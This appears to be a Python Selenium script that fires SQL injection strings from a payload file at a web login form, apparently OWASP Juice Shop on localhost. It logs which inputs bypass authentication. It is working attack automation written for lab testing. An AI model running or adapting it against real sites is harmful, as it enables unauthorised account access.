from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time

def sql_injection(base_url):
    # driver = webdriver.Firefox()
    chrome_options = Options()
    chrome_options.add_argument("--auto-open-devtools-for-tabs")  

    chrome_options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
    
    driver = webdriver.Chrome(options=chrome_options)

    with open('utils/sqli.txt', 'r') as file:
        statements = [line.strip() for line in file.readlines()]

    url = f'{base_url}/#/login'

    results = []

    driver.get(url)

    time.sleep(1)

    email_input = driver.find_element("xpath", '//input[@id="email"]')
    password_input = driver.find_element("xpath", '//input[@id="password"]')
    login_button = driver.find_element("xpath", '//button[@id="loginButton"]')

    #for owasp
    dismiss_button = driver.find_element("xpath", "//button[contains(@class, 'close-dialog')]")
    if dismiss_button:
        dismiss_button.click()

    password_input.send_keys("password")

    for statement in statements:
        email_input.clear()
        email_input.send_keys(statement)

        login_button.click()

        time.sleep(0.2)

        if driver.current_url != url:
            results.append(statement)
            driver.get(url)

            time.sleep(0.2)

            email_input = driver.find_element("xpath", '//input[@id="email"]')
            password_input = driver.find_element("xpath", '//input[@id="password"]')
            login_button = driver.find_element("xpath", '//button[@id="loginButton"]')
            password_input.send_keys("password")

    with open('results/results_sql_injection.txt', 'w') as result_file:
        if len(results) > 0:
            result_file.write("Successful SQL Injection Queries\n:")
            for statement in results:
                result_file.write(f"{statement}\n")

# sql_injection("http://localhost:3000")



        

